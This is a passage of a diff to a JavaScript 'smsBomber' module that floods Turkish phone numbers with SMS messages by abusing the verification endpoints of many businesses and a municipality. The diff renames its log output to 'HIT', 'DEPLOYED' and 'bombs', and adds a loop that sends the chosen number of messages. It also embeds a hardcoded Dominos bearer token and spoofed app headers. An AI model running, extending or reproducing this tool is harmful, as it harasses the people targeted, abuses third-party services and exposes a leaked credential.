+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Komagene] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Komagene]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Komagene] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -754,14 +851,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [KuryemGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [KuryemGelsin] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [KuryemGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [KuryemGelsin] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -789,14 +890,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Taksim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Taksim] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Taksim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Taksim] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -842,14 +947,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [ToptanTeslim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [ToptanTeslim] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [ToptanTeslim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [ToptanTeslim] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -880,14 +989,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Starbucks]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Starbucks] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Starbucks]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Starbucks] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             } 
@@ -940,14 +1053,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [BayDöner]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [BayDöner] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [BayDöner]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [BayDöner] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -974,14 +1091,18 @@ async function smsBomber(phone, amount) {
                     }, function (err, httpResponse, body) {
                         if (httpResponse?.statusCode == 200) {
                             dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Pidem]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.green("🚀 [HIT]") +
+                                chalk.cyan(" [Pidem] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.green("✅ DEPLOYED"));
                         } else {
                             dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Pidem]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.red("💥 [MISS]") +
+                                chalk.cyan(" [Pidem] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.red("❌ FAILED"));
                         }
                     });
                 }
@@ -1002,14 +1123,18 @@ async function smsBomber(phone, amount) {
                     }, function (err, httpResponse, body) {
                         if (httpResponse?.statusCode == 200) {
                             dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [BodrumBelediyesi]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.green("🚀 [HIT]") +
+                                chalk.cyan(" [BodrumBelediyesi] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.green("✅ DEPLOYED"));
                         } else {
                             dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [BodrumBelediyesi]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.red("💥 [MISS]") +
+                                chalk.cyan(" [BodrumBelediyesi] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.red("❌ FAILED"));
                         }
                     });
                 }
@@ -1038,14 +1163,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Fring]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Fring] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Fring]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Fring] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -1061,7 +1190,7 @@ async function smsBomber(phone, amount) {
                         "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", 
                         "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", 
                         "Appversion": "IOS-7.1.0", 
-                        "Accept-Encoding": "gzip, deflate, br", 
+                        "Accept-Encoding": "gzip, deflate", 
                         "Accept-Language": "tr-TR,tr;q=0.9", 
                         "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                         "Servicetype": "CarryOut", 
@@ -1076,14 +1205,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Dominos]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Dominos] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Dominos]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Dominos] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -1112,14 +1245,18 @@ async function smsBomber(phone, amount) {
                     }, function (err, httpResponse, body) {
                         if (httpResponse?.statusCode == 200) {
                             dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Yapp]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.green("🚀 [HIT]") +
+                                chalk.cyan(" [Yapp] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.green("✅ DEPLOYED"));
                         } else {
                             dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Yapp]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.red("💥 [MISS]") +
+                                chalk.cyan(" [Yapp] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.red("❌ FAILED"));
                         }
                     });
                 }
@@ -1145,14 +1282,18 @@ async function smsBomber(phone, amount) {
                     }, function (err, httpResponse, body) {
                         if (httpResponse?.statusCode == 200) {
                             dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Porty]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.green("🚀 [HIT]") +
+                                chalk.cyan(" [Porty] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.green("✅ DEPLOYED"));
                         } else {
                             dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Porty]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.red("💥 [MISS]") +
+                                chalk.cyan(" [Porty] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.red("❌ FAILED"));
                         }
                     });
                 }
@@ -1178,14 +1319,18 @@ async function smsBomber(phone, amount) {
                     }, function (err, httpResponse, body) {
                         if (httpResponse?.statusCode == 200) {
                             dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Clickme]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.green("🚀 [HIT]") +
+                                chalk.cyan(" [Clickme] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.green("✅ DEPLOYED"));
                         } else {
                             dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Clickme]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.red("💥 [MISS]") +
+                                chalk.cyan(" [Clickme] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.red("❌ FAILED"));
                         }
                     });
                 }
@@ -1209,14 +1354,18 @@ async function smsBomber(phone, amount) {
                     }, function (err, httpResponse, body) {
                         if (httpResponse?.statusCode == 200) {
                             dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.green("🚀 [HIT]") +
+                                chalk.cyan(" [Akbati] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.green("✅ DEPLOYED"));
                         } else {
                             dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.red("💥 [MISS]") +
+                                chalk.cyan(" [Akbati] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.red("❌ FAILED"));
                         }
                     });
                 }
@@ -1239,14 +1388,18 @@ async function smsBomber(phone, amount) {
                     }, function (err, httpResponse, body) {
                         if (httpResponse?.statusCode == 200) {
                             dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.green("🚀 [HIT]") +
+                                chalk.cyan(" [Akbati] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.green("✅ DEPLOYED"));
                         } else {
                             dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                                chalk.red("💥 [MISS]") +
+                                chalk.cyan(" [Akbati] ") +
+                                chalk.white(`Target: +90${no} `) +
+                                chalk.red("❌ FAILED"));
                         }
                     });
                 }
@@ -1298,27 +1451,35 @@ async function smsBomber(phone, amount) {
 
             async function systemFinished() {
                 if (systemFinishedT == true) return;
-                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                    chalk.greenBright("[smsSystem]") +
-                    chalk.blueBright(` Toplamda ${dataSb.total} adet sms gönderildi. (${dataSb.success} başarılı, ${dataSb.error} hatalı)`));
+                
+                console.log('\n' + chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
+                console.log(chalk.green.bold('🏆 MISSION COMPLETED SUCCESSFULLY 🏆'));
+                console.log(chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
+                console.log(chalk.cyan(`📊 Total Deployed: ${dataSb.total} bombs`));
+                console.log(chalk.green(`✅ Successful: ${dataSb.success} hits`));
+                console.log(chalk.red(`❌ Failed: ${dataSb.error} misses`));
+                console.log(chalk.yellow(`🎯 Success Rate: ${((dataSb.success/dataSb.total)*100).toFixed(2)}%`));
+                console.log(chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'));
+                
                 const result = { status: true, dataSb };
                 systemFinishedT = true;
-               return resolve(result);
+                return resolve(result);
             }
+
+            for (let i = 0; i < amount; i++) {
+                await send(phone);
+                await delaySystem(1000);
+            }
+
         } catch (e) {
-            console.error("Hata oluştu:", e);
-            const result = { status: false, message: "Bir hata oluştu." };
+            console.error(chalk.red("💀 [CRITICAL ERROR] System failure:"), e);
+            const result = { status: false, message: "Critical system error occurred." };
             reject(result);
         }
     });
 
     const result = await queryPromise;
-    if (result.status) {
-        console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] > `) + chalk.greenBright("[smsSystem]") + chalk.blueBright(` ${phone} numarasına ${amount} adet sms gönderildi.`));
-        return { status: true, dataSb: result.dataSb };
-    } else {
-        return { status: false, message: result.message };
-    }
+    return result;
 }
 
 module.exports = smsBomber;
